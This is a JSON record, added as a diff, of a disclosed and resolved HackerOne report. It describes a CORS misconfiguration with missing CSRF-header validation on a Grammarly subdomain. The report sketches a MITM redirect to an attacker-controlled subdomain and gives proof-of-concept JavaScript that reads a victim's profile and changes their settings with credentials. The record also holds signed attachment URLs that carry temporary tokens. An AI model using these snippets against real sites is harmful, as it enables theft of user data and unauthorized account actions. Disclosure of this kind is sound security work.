@@ -1,0 +1,150 @@
+{
+  "id": 629892,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk4OTI=",
+  "url": "https://hackerone.com/reports/629892",
+  "title": "Lack of CSRF header validation at https://g-mail.grammarly.com/profile",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-06-26T08:34:39.923Z",
+  "submitted_at": "2019-06-26T08:34:39.923Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "orlserg",
+    "url": "/orlserg",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/344/557/e52419d580024b46dfc518300c1293bb341bc0e8_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22746,
+    "url": "https://hackerone.com/grammarly",
+    "handle": "grammarly",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/gx1qb7440tyefirbxv1tkl1ty186/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/gx1qb7440tyefirbxv1tkl1ty186/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Grammarly",
+      "twitter_handle": "",
+      "website": "https://www.grammarly.com",
+      "about": "Grammarly makes sure everything you type is clear, effective, and mistake-free."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-31T03:57:12.157Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-10-31T03:57:12.058Z",
+  "team_member_agreed_on_going_public_at": "2019-10-30T13:21:44.481Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello!\n\n## Description\nI found that setting up a CORS in some places will check the protocol, but it allows using http scheme. In addition, any subdomain is considered trusted. If the origin is *http://www.grammarly.com*, then the server will respond: *Access-Control-Allow-Origin: http://www.grammarly.com*. That can lead to leakage of user data and unauthorized actions on behalf of the user.\n{F517015}\n\nIn fact, this means that an attacker can use the MITM attack (Wi-Fi, local networks, etc.) to substitute client requests, thus replacing the origin. \n\n####*Important note: I very carefully read the program policy and focus on the fact that MITM attack is not made on the existent grammarly sites.*\n\n## How it works\n{F517002}\n\nIf an attacker can perform a mitm attack on a user, he can replace the requested content of any unencrypted request and produce a 302 redirect of the user to http: //evil.grammarly.com. Since the request is not unencrypted, the attacker can also replace the response and implement javascript that performs a requests to vulnerable endpoints. Thus, the vulnerable enpoint will think that the request came from the origin of the trust it trusts and will execute the request.\n\nUsing a header to send a CSRF token protects against such attacks. But I found a place where verification of the transferred token is not performed.\n\nThis vulnerability was perfectly described by James Kettle on OWASP AppSec EU 2017. You can watch the description of the vulnerability on the link to his presentation. https://youtu.be/wgkj4ZgxI4c?t=1139\n\n## Vulnerable enpoints\n\n1) The malicious javascript will look like:\n\n```javascript\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\n   if (this.readyState == 4 && this.status == 200) {\n       document.getElementById(\"response-node\").innerHTML = this.responseText;\n   }\n};\nxhttp.open(\"GET\", \"https://g-mail.grammarly.com/profile\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n```\nThe response will contain the user's email address and subscription settings:\n```\n{\"id\":749327815,\"email\":\"email@yandex.ru\",\"preferenceFields\":[{\"name\":\"Weekly Progress Reports\",\"description\":\"Get a weekly report with statistics and insights on how you are writing with Grammarly.\",\"order\":49,\"value\":true},{\"name\":\"Product Updates\",\"description\":\"Important info on new features and products. We may also ask for your feedback on occasion.\",\"order\":50,\"value\":true},{\"name\":\"Grammarly Offers\",\"description\":\"These emails may include special upgrade offers, limited-time events, or coupons. \",\"order\":50,\"value\":true},{\"name\":\"The Grammarly Blog\",\"description\":\"A weekly newsletter that includes fun tips on all things writing.\",\"order\":50,\"value\":true},{\"name\":\"Grammarly Business\",\"description\":\"Updates and information on our products for multi-person teams.\",\"order\":55,\"value\":true}],\"unsubscribe\":false}\n``` \n\n2) The malicious javascript will look like:\n\n```javascript\nvar xhttp = new XMLHttpRequest();\nvar data = new FormData();\ndata.append(\"email\", \"████████\");\ndata.append(\"unsubscribe\", \"false\");\n(...)\nxhttp.open(\"POST\", \"https://g-mail.grammarly.com/profile\", true);\nxhttp.withCredentials = true;\nxhttp.send(data);\n```\nThe request will change the subscription settings. It looks like CSRF.\n\nNow I'm trying to find more places to increase the impact.\n\n## Impact\n\nCORS misconfiguration lead to leakage of user data and unauthorized actions on behalf of the user.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 517002,
+      "file_name": "CORS.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/002/5314045f608f7d9a3c59bd50991770fae7e3a678/CORS.png?response-content-disposition=attachment%3B%20filename%3D%22CORS.png%22%3B%20filename%2A%3DUTF-8%27%27CORS.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6EZXH3ZQ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T135826Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEdAxoz4Y8fFbVkyPQZuAz%2FTO7g0O5hk%2BWPV4HhoCnfWAiA%2B%2BdvO4JgFOHorEo%2By8dOyVXQ5nzV8aWyrTcHJ99txlSqyBQgUEAMaDDAxMzYxOTI3NDg0OSIMdkXL0YE4tR8%2BK7cLKo8FPejJmIYKFdTKz0rimiR5%2FAddCd92%2F4x5A9kE1tZo1%2B19mQdkBA9WOdmH%2BbmTUpnVtu%2FfGVVVDf2%2BZEa%2F8wRwwDwu%2FzOIffONBQqkd%2BoaBEz5L1jfe59Sm6iQ7RqjNa5k2DLQQilDa%2FM64aFf5dowbgLmFhQUnS6vvKYZ4o5wN20uTXzq7wPWhRpVr5kqLzsyVTaD7DfGZ5RD2kzHEJWXW62F7wKyHDi%2FqscLwZvMO6YfufGCemRvK6iwvSoeLWvnOW5bXxuUXlVeW2mWz9GrE0aptxi3%2BteK2MWMx3EwBYaez8wuW5FFnwsK6uPCWr8rPypsYnprTWrCpwEiKCGNEcszn8Gng77mMXuKuwsQK2Zue8XbnMLW1e%2BUYvexsi9BBxKNLSWhFWRsTN2unqyrlRYoFUsHk6zKE64uxbOQ7vl2QiWKbnrqYmh3e3jprv8GSyTFSHLiyliSHbw19mUIGG3Zo%2Bh48K8Jl1010C3m%2BlHMTDrOj9RsZcRpqqQHcsQiE4wqYBuJP7GfkmTZrRdSywoejJogNVmYR8WTGe42yN0rIXEt77fDR9qgIGAZZ6exyz%2Fj7VFuaXvio2eQEKmi8IF8q0wFXaBjOR6hXw0UA5zdTZjC1cDhluKmL6wwlIX%2BKobxDpn2uzlmLMpMva%2BEQX2a7eZUHv4mYjLaNO03Gj8WDqqfr7StbbOpQTH7yDUPBKHvaRh60A3vziaux5AMzjBOypcbQWgoZw%2BacKyB0iCl%2FDtlKNK7w2H6NwwMiHRBQIzxw9DFkjxfTKXG2Q4mIxT5VUPJebnnLxa0J%2FFJhR74H8kaDwICWPmppVPElp8yzDzvCFPUqjEZ9MSb%2F5ONKqX8Dvl0oSU6YkD6H9ElyTDkvL%2FGBjqyAXdUlI0kdmwuGQTL1VbDHfXRoAYXbOGuAZIjBhv7%2BFZaLSBFziHhnfcsXdplMdW%2F1vD1%2FjviUqubFnog8fP%2FnKBJNpg2GMAab2CjXGAwogD%2FqSAz8NLKYNd726CkJGpsxA3aBIFANXZlODp4iYrpbA6elQOLToustaBCGZ1WTFK1dUqA3oA7KpTqjxp8R515fj9KjV50VXDPDr2oYqkVeEIbcMJSltlmXcyLDUz55uvuILU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=46c5cd9174b2a9e35625b1b0cbe0e2c7eb36cf4585b1aa2b2cd84ad7e152c7dd",
+      "file_size": 145999,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 517015,
+      "file_name": "burp.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/015/406cdd11968ad8a0378c32ecdaceba07880db2c2/burp.png?response-content-disposition=attachment%3B%20filename%3D%22burp.png%22%3B%20filename%2A%3DUTF-8%27%27burp.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6EZXH3ZQ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T135826Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEdAxoz4Y8fFbVkyPQZuAz%2FTO7g0O5hk%2BWPV4HhoCnfWAiA%2B%2BdvO4JgFOHorEo%2By8dOyVXQ5nzV8aWyrTcHJ99txlSqyBQgUEAMaDDAxMzYxOTI3NDg0OSIMdkXL0YE4tR8%2BK7cLKo8FPejJmIYKFdTKz0rimiR5%2FAddCd92%2F4x5A9kE1tZo1%2B19mQdkBA9WOdmH%2BbmTUpnVtu%2FfGVVVDf2%2BZEa%2F8wRwwDwu%2FzOIffONBQqkd%2BoaBEz5L1jfe59Sm6iQ7RqjNa5k2DLQQilDa%2FM64aFf5dowbgLmFhQUnS6vvKYZ4o5wN20uTXzq7wPWhRpVr5kqLzsyVTaD7DfGZ5RD2kzHEJWXW62F7wKyHDi%2FqscLwZvMO6YfufGCemRvK6iwvSoeLWvnOW5bXxuUXlVeW2mWz9GrE0aptxi3%2BteK2MWMx3EwBYaez8wuW5FFnwsK6uPCWr8rPypsYnprTWrCpwEiKCGNEcszn8Gng77mMXuKuwsQK2Zue8XbnMLW1e%2BUYvexsi9BBxKNLSWhFWRsTN2unqyrlRYoFUsHk6zKE64uxbOQ7vl2QiWKbnrqYmh3e3jprv8GSyTFSHLiyliSHbw19mUIGG3Zo%2Bh48K8Jl1010C3m%2BlHMTDrOj9RsZcRpqqQHcsQiE4wqYBuJP7GfkmTZrRdSywoejJogNVmYR8WTGe42yN0rIXEt77fDR9qgIGAZZ6exyz%2Fj7VFuaXvio2eQEKmi8IF8q0wFXaBjOR6hXw0UA5zdTZjC1cDhluKmL6wwlIX%2BKobxDpn2uzlmLMpMva%2BEQX2a7eZUHv4mYjLaNO03Gj8WDqqfr7StbbOpQTH7yDUPBKHvaRh60A3vziaux5AMzjBOypcbQWgoZw%2BacKyB0iCl%2FDtlKNK7w2H6NwwMiHRBQIzxw9DFkjxfTKXG2Q4mIxT5VUPJebnnLxa0J%2FFJhR74H8kaDwICWPmppVPElp8yzDzvCFPUqjEZ9MSb%2F5ONKqX8Dvl0oSU6YkD6H9ElyTDkvL%2FGBjqyAXdUlI0kdmwuGQTL1VbDHfXRoAYXbOGuAZIjBhv7%2BFZaLSBFziHhnfcsXdplMdW%2F1vD1%2FjviUqubFnog8fP%2FnKBJNpg2GMAab2CjXGAwogD%2FqSAz8NLKYNd726CkJGpsxA3aBIFANXZlODp4iYrpbA6elQOLToustaBCGZ1WTFK1dUqA3oA7KpTqjxp8R515fj9KjV50VXDPDr2oYqkVeEIbcMJSltlmXcyLDUz55uvuILU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=410515c4ec1334b2eec7037d86239ae2655e91f97f9dfb705c972528c39267f3",
+      "file_size": 61532,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-11-29T13:21:44.583Z",
+  "allow_singular_disclosure_after": -183429401.64188573,
+  "singular_disclosure_allowed": true,
+  "vote_count": 134,
+  "voters": [
+    "dls_",
+    "nicochess",
+    "megaknight",
+    "d0kkillo",
+    "base_64",
+    "sameerphad72",
+    "orlserg",
+    "spam404",
+    "dhakal_ananda",
+    "metnew",
+    "and 124 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.2,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 1366,
+    "asset_type": "URL",
+    "asset_identifier": "www.grammarly.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
